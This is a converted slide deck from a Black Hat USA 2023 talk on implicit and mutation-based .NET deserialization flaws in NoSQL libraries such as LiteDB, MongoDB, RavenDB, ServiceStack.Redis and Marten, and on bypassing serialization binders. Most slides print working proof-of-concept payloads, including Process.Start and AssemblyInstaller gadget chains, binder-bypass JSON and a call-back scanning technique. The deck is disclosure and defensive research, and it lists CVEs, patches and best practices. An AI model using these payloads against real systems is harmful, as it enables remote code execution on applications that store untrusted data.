---
title: "Second Breakfast Implicit and Mutation-Based Serialization Vulnerabilities in dotNET"
speakers: ["Jonathan Birch"]
conference: "Black Hat"
conference_full: "Black Hat USA 2023"
edition: "USA"
year: 2023
source_pdf: "Black Hat USA 2023 slides/Jonathan Birch_Second Breakfast Implicit and Mutation-Based Serialization Vulnerabilities in dotNET.pdf"
pages: 52
sha256: "cdb4281794354834c08bfe8268fc145cfde0aac284ba668a5b07615d959fa0df"
text_chars: 19964
ocr_pages: 1
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:17:46Z"
---
# Second Breakfast Implicit and Mutation-Based Serialization Vulnerabilities in dotNET

**Speakers:** Jonathan Birch  
**Conference:** Black Hat USA 2023  
**Source:** `Black Hat USA 2023 slides/Jonathan Birch_Second Breakfast Implicit and Mutation-Based Serialization Vulnerabilities in dotNET.pdf` (52 pages)


## Slide 1

## Second Breakfast

Implicit and Mutation-Based Serialization Vulnerabilities in .NET

## Slide 2

### Who I am

- Jonathan Birch

   - Principal Security Software Engineer at Microsoft

- I hack Office.

- <u>infosec.exchange/@seibai</u>

# 𓀬

## Slide 3

### What this talk is about

- RCE vulnerabilities in NoSQL engines due to implicit .NET deserialization

   - LiteDB, MongoDB, RavenDB, MartenDB, and ServiceStack.Redis

- Mutation-based serialization vulnerabilities

   - Enable Remote Code Execution even if the serialized data can't be tampered with

- Techniques for bypassing serialization binders

- How to defend against these attacks

## Slide 4

Reviewing LiteDB

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Reviewing LiteDB
Hacker News new | past | comments | ask | show | jobs | submit
oints b ni 7 month o | hide | p
namespace LiteDB
{
public class DefaultTypeNameBinder : ITypeNameBinder
{
public static DefaultTypeNameBinder Instance { get; } = new DefaultTypeNameBinder();
private DefaultTypeNameBinder()
{
}
non
public string GetName(Type type) => type.FullName + ", + type.G eInfo().Assembly.GetName().Name;
```

## Slide 5

### What’s so bad about Type.GetType?

“DBClient.StorageObject”

**(Just a string, mostly harmless)**

Type.GetType

StorageObject **(Actual .NET Type Object, less harmless)**

**(User-provided data)**

Custom Serializer

**(Actual objects, aka code)**

## Slide 6

How does LiteDB use Type.GetType? Client

.NET Object inserted into DB BSON
BsonMapper
Application  Database
Data
File
BsonMapper
.NET Object read from DB BSON

## Slide 7

### How does LiteDB use Type.GetType?

BSON is just a JSON encoding. As JSON, LiteDB’s data storage looks like this: { _id: 1, **_type:** " **DBClient.StorageObject, DBClient** ", Name: "Attachment“ ⋮ }

That “_type” member is passed to Type.GetType when LiteDB converts BSON into objects, to determine what type of object to create.

This _is_ just a polymorphic serializer!

## Slide 8

Background: .NET Serialization Vulnerabilities

## Slide 9

### How .NET serialization vulnerabilities work

Deserialize
Self-describing data Objects
Deserialize

*For more info see “Friday the 13th JSON Attacks”, Black Hat 17, by Alvaro Muñoz & Oleksandr Mirosh

## Slide 10

### Some dangerous .NET types

- **AssemblyInstaller** – setting the “path” property will cause a DLL at that path to be loaded.

   - Only local files will be loaded, but if you set an HTTP URL, the framework _will_ make a request to the URL.

   - Good for ping-back tests.

- **ObjectDataProvider** – allows any static method on any type to be called when its properties are set.

   - Process.Start is popular

## Slide 11

Implicit Serialization Vulnerabilities in NoSQL Engines

## Slide 12

### A simple exploit for                         v5.0.12

**Data choosing what type it will be.**

```
const stringbadJson=@"{""_type"":""System.Windows.Data.ObjectDataProvider,
PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"",
""ObjectInstance"":{""_type"":""System.Diagnostics.Process, System, Version=4.0.0.0,
Culture=neutral, PublicKeyToken=b77a5c561934e089"",
```

```
""StartInfo"":{""_type"":""System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0,
Culture=neutral, PublicKeyToken=b77a5c561934e089"", ""FileName"":""calc.exe""}},
""MethodName"":""Start""}";
```

**This type doesn’t matter!**

```
BsonValuebson=JsonSerializer.Deserialize(badJson);
BsonMappermyMapper=newBsonMapper();
```

```
Object rehydratedObject = myMapper.Deserialize<StorageObject>(bson); //this will launch calc
```

## Slide 13

### Implicit Deserialization in LiteDB

#### **Anything that puts bad data here gives you RCE!**

Client you RCE!
.NET Object inserted into DB BSON
BsonMapper
Application  Database
Data
File
BsonMapper
.NET Object read from DB BSON
•
Providing a DB File => RCE
•
Query Injection => RCE
(Doesn’t directly use a serializer.) • Plus one other method…

## Slide 14

An exploit for                                v2.18.0

```
const string payloadJson=@"{"“Member"":
```

**Data choosing its type**

```
{""_t"":""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0,
Culture=neutral, PublicKeyToken=31bf3856ad364e35"",
```

```
""ObjectInstance"":{""_t"":""System.Diagnostics.Process, System, Version=4.0.0.0,
Culture=neutral, PublicKeyToken=b77a5c561934e089"",
```

`""StartInfo"":{""_t"":""System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"", ""FileName"":""calc.exe""}}, ""MethodName"":""Start""},""name"":""thing""}";` **This type does matter!**

```
BsonDocumentparsedDoc=BsonDocument.Parse(payloadJson);
//this next line launches calc
```

```
ObjectdeserializedThing =BsonSerializer.Deserialize<StorageObject>(parsedDoc);
```

## Slide 15

### Implicit Serialization Vulnerabilities

- MongoDB was exploitable in most of the same ways as LiteDB. RCE is possible when either:

   - An attacker writes a record directly that is later read.

   - An attacker performs query injection to alter a record that is later read.

- Both attacks require that an application tries to read a generic object from MongoDB, like a record with a member of type “Object” or an object with an interface member.

- I was only able to exploit the .NET driver, not Java or Python.

## Slide 16

### An Exploit for                             v5.4.5

**Data telling you its type**

```
const string calcPayload =@"{'Member':{""$type"": ""System.Security.Principal.WindowsIdentity,
mscorlib, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=b77a5c561934e089"",""System.Security.ClaimsIdentity.actor"":
""<BinaryFormatterPayload>""}}";
```

```
stringurl = @"http://DBServer:8080/databases/HackDB/docs?id=HackDocument";
varwebRequest = System.Net.HttpWebRequest.CreateHttp(url);
webRequest.Method ="PUT";
```

```
webRequest.ContentType = "application/json";
varstream = webRequest.GetRequestStream();
```

```
using(varwriter=newSystem.IO.StreamWriter(webRequest.GetRequestStream()))
{
```

```
   writer.Write(calcPayload);
}
```

```
varwebResponse = webRequest.GetResponse();
webResponse.Close();
```

## Slide 17

### Implicit Serialization Vulnerabilities

- RavenDB just uses JSON.Net to store and read data from the database, so JSON.Net payloads work as exploits.

- Exploitable scenarios include:

   - An attacker writes a record to a DB that is later read.

   - An attacker performs query injection to update a record that is later read.

   - That special one that I’ll talk about later.

- Like MongoDB, RavenDB checks assignability (because JSON.Net does).

## Slide 18

### An Exploit for ServiceStack.Redis v6.5.0

`const string payloadString = @"{""Member"": {""__type"":""System.Configuration.Install.AssemblyInstaller,` **Data saying what it wants to be** `System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"",`

```
""Path"":""malicious.dll""}}";
```

```
varmanager = newRedisManagerPool(“dbserver:6379");
StorageObjectrecord;
```

`using (var client = manager.GetClient()) {` **This type does matter!** `//write malicious data as string`

```
client[“cacheKey1"] = payloadString;
```

- `//read malicious data as object`

```
record = client.Get<StorageObject>(“cacheKey1");
}
```

## Slide 19

### ServiceStack.Redis Vulnerabilities

ServiceStack.Redis uses its own serializer, and was exploitable when:

- An attacker writes an object or a string to the cache that is later read as an object.

- Deserializing attacker-provided strings with ServiceStack.Text.JsonSerializer

- That extra pattern that I’ll get to next …

## Slide 20

### Exploiting Marten DB

- MartenDB is a .NET NoSQL interface to PostGres Databases

- Like RavenDB, it uses JSON.NET with unsafe settings to serialize objects for storage.

- But MartenDB doesn’t allow direct writing of JSON, and my initial attempts to serialize dangerous objects into a database record kept failing.

- Then I discovered a different way to attack it…

## Slide 21

Serialization Mutation Attacks

## Slide 22

### Exploiting Marten v5.11.0 with Mutation

```
Dictionary<string,string> extraData = newDictionary<string,string>();
extraData.Add("$type", "System.Activities.Presentation.WorkflowDesigner,
System.Activities.Presentation, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=31bf3856ad364e35");
```

```
extraData.Add("PropertyInspectorFontAndColorData", @"<ResourceDictionary
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""><ObjectDataProvider x:Key=""""
MethodName=""Start""><ObjectDataProvider.ObjectInstance><Process xmlns=""clr-
namespace:System.Diagnostics;assembly=system""><Process.StartInfo><ProcessStartInfo
FileName =
```

```
""calc.exe""/></Process.StartInfo></Process></ObjectDataProvider.ObjectInstance></ObjectDa
taProvider></ResourceDictionary>");
```

```
StorageObjectmaliciousObject =newStorageObject() { Id = 123456, Member = extraData };
session.Store(maliciousObject);//reading this object launches calc!
```

## Slide 23

### Mutation Attacks in JSON.Net

Consider how a dictionary is serialized in JSON.Net: `Dictionary<string, string> data = new Dictionary<string, string>() {["Fruit"]="Pear" };` becomes

```
{“Fruit”:”Pear”}
```

Compare this to a simple RCE payload for JSON.NET: `{"$type":"System.Configuration.Install.AssemblyInstaller , System.Configuration.Install", "Path":"malicious.dll"}`

## Slide 24

### Mutation Attacks in JSON.Net

- There’s nothing special about the “$type” key!

- This dictionary serializes to JSON that causes RCE if it’s deserialized: `Dictionary<string, string> data = new Dictionary<string, string>() {`

```
["$type"]= "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install",
```

- `["path"]="malicious.dll"};`

- The same thing happens for other types with key-value structures: HashTable, JObject and ExpandoObject can also serialize to set arbitrary keys.

## Slide 25

### Example Mutation Attack Flow

Unsafe
Form Post Database
Serializer
or Cache
Dictionary or
Malicious Key-Value Data in a Web Form
HashTable
Later…
Unsafe
Database
Serializer
or Cache
RCE Gadget
(Not a dictionary!)

## Slide 26

### Mutation attacks against                    v5.0.12

```
Dictionary<string,string> stringDictionary = newDictionary<string,string>();
stringDictionary.Add("_type","System.Configuration.Install.AssemblyInstaller,
System.Configuration.Install");
```

```
stringDictionary.Add("Path","malicious.dll");
```

```
Object result;
```

```
using(varbadDB = newLiteDatabase(@"Mutation.db"))
{
```

```
varcol = badDB.GetCollection<Dictionary<string,string>>("PropertyCollections");
col.Insert(stringDictionary);
```

```
result = col.FindById(col.Min());//this runs code!
}
```

## Slide 27

### .NET Serializers Vulnerable to Mutation

|**Serializer**|**Need to control first key pair?**|**Checks assignability?**|**Other limitations**|
|---|---|---|---|
|JSON.Net|Yes|Yes|Unsafe TypeNameHandling|
|JavaScriptSerializer|No|No|SimpleTypeResolver|
|LiteDB v5.0.12|No|Only in v>=5.0.13|None|
|ServiceStack.Text v6.5.0|Yes|Yes|None|
|RavenDB|Yes|Yes|None|
|MartenDB v5.11.0|No|Yes|None|

#### **Note: I haven’t found a way to exploit mutation against MongoDB’s .NET driver.**

## Slide 28

### Limitations on Serialization Mutation

- JSON.Net mutation attacks only work if:

   - The attacker controls the first key and value in a key-value object.

   - Data is deserialized with an unsafe TypeNameHandling value.

   - Either the data is _not_ serialized with TypeNameHandling.All or TypeNameHandling.Objects, or the object being serialized is something where JSON.Net never emits type information for it, like JObject.

- JavaScriptSerializer mutation attacks are much more robust:

   - Controlling any two key-value pairs is sufficient

   - Deserialization must be done with a SimpleTypeResolver

## Slide 29

### Defending against Mutation Attacks

- The best approach is to use a safe serializer

   - Anything that doesn’t read type information should be ok.

   - System.Text.Json.JsonSerializer appears to be safe from these attacks.

- Using a SerializationBinder can help

   - Mutation attacks depend on tricking an application into creating objects with unexpected types. A good SerializationBinder can prevent this.

   - That said, SerializationBinders have their weaknesses too.

## Slide 30

Bypassing Serialization Binders

## Slide 31

### Background: Serialization Binders

Deserialize Deserialize
Self-describing data Objects
Deserialize
Exception thrown,
Object creation blocked
Allow: Cat, Dog Serialization Binder

## Slide 32

### Example of a good SerializationBinder

This SerializationBinder creates a strict allow-list for which types can be created during deserialization.

```
classTypeAllowListBinder: SerializationBinder
```

```
{
```

```
public override Type BindToType(stringassemblyName,stringtypeName)
{
```

```
List<Type> allowedTypes =newList<Type>() {typeof(System.Exception),
typeof(StorageRecord) };
```

```
//always compare strings, not types!
```

```
returnallowedTypes.First<Type>(t => (t.FullName == typeName &&
```

```
t.Assembly.FullName == assemblyName));//exception on fail, not null!
}
}
```

## Slide 33

### Example of a bad SerializationBinder

This SerializationBinder allows any type from a specific assembly: `class AllowedAssembliesBinder : SerializationBinder {`

```
public override Type BindToType(stringassemblyName,stringtypeName)
{
```

```
List<Assembly> allowedAssemblies =
```

```
newList<Assembly>() {Assembly.Load("SerializationBinderExample")};
```

```
      //this is a bad idea
```

```
returnallowedAssemblies.First<Assembly>(
```

```
a => (a.FullName == assemblyName)).GetType(typeName);
   }
}
```

## Slide 34

Tricking a SerializationBinder with a Generic Consider what happens if our trusted assembly has a type like this: `public class InitializedList<T> : System.Collections.Generic.List<T> { public bool IsInitialized = false; }`

## Slide 35

### Tricking a SerializationBinder with a Generic

Here’s a JSON.Net RCE payload that bypasses the assembly allow-list binder: **The only type being passed to the binder here is “InitializedList”, which comes from our trusted assembly.**

```
{"$type":"SerializationBinderExample.InitializedList`1[[System.Configuration
.Install.AssemblyInstaller,System.Configuration.Install]],
SerializationBinderExample", "$values":[{"path":“malicious.dll"}]} *
```

**When this is parsed, an AssemblyInstaller object is created, even though the binder was never asked!**

*Version info and public key strings omitted for ease of reading

## Slide 36

### Bypassing SerializationBinders with Contagion

- For JSON.Net, and some other serializers, only types listed directly in the serialized payload are passed to a SerializationBinder.

- Types of fields, properties, and constructor arguments can be passed, but they don’t have to be.

- If a type has a settable member whose type is dangerous, that member can be exploited without its dangerous type being passed to a binder.

- This effect **_chains_** .

## Slide 37

### Contagion Chain Example

- The type System.Security.Principal. **WindowsIdentity** can be used to get RCE if deserialized with JSON.Net.

- Let’s say there’s a SerializationBinder that specifically blocks this type. What other types can we pass by a binder and still get RCE with the WindowsIdentity type?

## Slide 38

### Bypassing a binder with contagion

System.Web.Security. **WindowsAuthenticationEventArgs** has a constructor argument “identity” with the type “ **WindowsIdentity** ”, so we can build a payload like this:

```
{"$type":"System.Web.Security.WindowsAuthenticationEventArgs,
System.Web, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=b03f5f7f11d50a3a",
```

```
"identity":{"System.Security.ClaimsIdentity.actor":
"<BinaryFormatterPayload>"}}
```

**Deserializing this will make a WindowsIdentity, even though the**

**binder is never asked!**

## Slide 39

What’s been fixed

## Slide 40

### NoSQL Fix Details

|**Library**|**Patched Version**|**CVE**|**Nature of patch**|
|---|---|---|---|
|LiteDB*|5.0.13|CVE-2022-23535|Assignability check, type
block list|
|MongoDB|2.19|CVE-2022-48282|Type allow-list|
|RavenDB|5.4.104|NA|Type block list added in
v5.4.103, patched to
address generic bypass in
v5.4.104|
|ServiceStack.Redis|6.6.0|NA|Allow list expected type
and all Serializable,
DataContract, or
RuntimeSerializable
types**|
|MartenDB|Not yet patched|NA||

*This library is no longer being maintained.

**Can still be exploited using a generic binder bypass as of v6.9.0

## Slide 41

### Json.NET will not be fixed

• I informed the maintainers of Json.NET of the mutation issue in January.

• They have chosen not to make changes, saying that the behavior is expected.

## Slide 42

### JavaScriptSerializer will not be fixed

• I informed the .NET team of the mutation issue in JavaScriptSerializer in January.

• .NET has also chosen not to make fixes for this issue, saying that use of SimpleTypeResolver is already discouraged.

## Slide 43

Best Practices

## Slide 44

### Don’t use or create polymorphic deserializers

- None of the attacks in this talk work against a serializer that doesn’t read type information from the data stream. System.Text.Json.JsonSerializer should be safe.

- Never call Type.GetType in .NET or Class.forName in Java with userprovided strings. Don’t use TypeResolvers either.

- Mutation attacks mean that even using an unsafe serializer purely on the back end can be dangerous.

## Slide 45

### Don’t read untrusted data from NoSQL

- Most .NET NoSQL engines are still vulnerable to remote code execution if an attacker can write arbitrary data to a record.

- • NoSQL libraries for frameworks other than .NET might be vulnerable too.

## Slide 46

### Avoid using SerializationBinder if possible

- It’s very difficult to write a secure SerializationBinder.

- It’s best to structure your application so that a SerializationBinder is never needed. Just avoid polymorphic serializers.

- If you must use a SerializationBinder, only allow-list fully-specified PODS types.

## Slide 47

### Sound Bytes

- Reading untrusted data from NoSQL is usually a security vulnerability.

- Mutation attacks make it possible to exploit unsafe serialization even if the serialized data is protected.

- Serialization Binders are often insufficient and vulnerable to bypass.

## Slide 48

Questions? <u>infosec.exchange/@seibai</u>

## Slide 49

Bonus Slides

## Slide 50

### Example Json.NET Mutation Exploit

```
Dictionary<string,string> basicStringDict = newDictionary<string,string>();
basicStringDict.Add("$type","System.Configuration.Install.AssemblyInstaller,
System.Configuration.Install, Version = 4.0.0.0, Culture = neutral, PublicKeyToken =
b03f5f7f11d50a3a");
```

```
basicStringDict.Add("Path","https://www.example.com/fake.dll");
```

```
JsonSerializerSettings settings = newJsonSerializerSettings() { TypeNameHandling =
TypeNameHandling.Auto };
```

```
stringserializedDictionary = JsonConvert.SerializeObject(basicStringDict, settings);
System.Console.WriteLine(serializedDictionary);
```

```
Object deserialized = JsonConvert.DeserializeObject(serializedDictionary, settings);
System.Console.ReadLine();//needed so that we don't exit before the request is made
```

## Slide 51

### Example JavaScriptSerializer Mutation Exploit

```
Dictionary<string,string> stringDict = newDictionary<string,string>();
stringDict.Add("Apple","Pear");//having other entries makes no difference
stringDict.Add("__type","System.Configuration.Install.AssemblyInstaller,
System.Configuration.Install, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=b03f5f7f11d50a3a");
```

```
stringDict.Add("Whatever","Whatever");//having other entries makes no difference
stringDict.Add("Path","https://www.example.com/fake.dll");
```

```
JavaScriptSerializer serializer = newJavaScriptSerializer(newSimpleTypeResolver());
stringjson = serializer.Serialize(stringDict);
```

```
Object myDeserializedObject = serializer.Deserialize<Dictionary<string,string>>(json);
System.Console.ReadLine();//wait for request to be made
```

## Slide 52

### Scanning for mutation vulnerabilities

- If data being sent to a service looks like it has a string->string key value collection structure, you can insert a type key set to the .NET AssemblyInstaller type and a path key set to the URL of a server you control and use the path to indicate the injection context.

- Later, if the server serializes and deserializes the collection in a way that allow serialization mutation, your server should get a request.
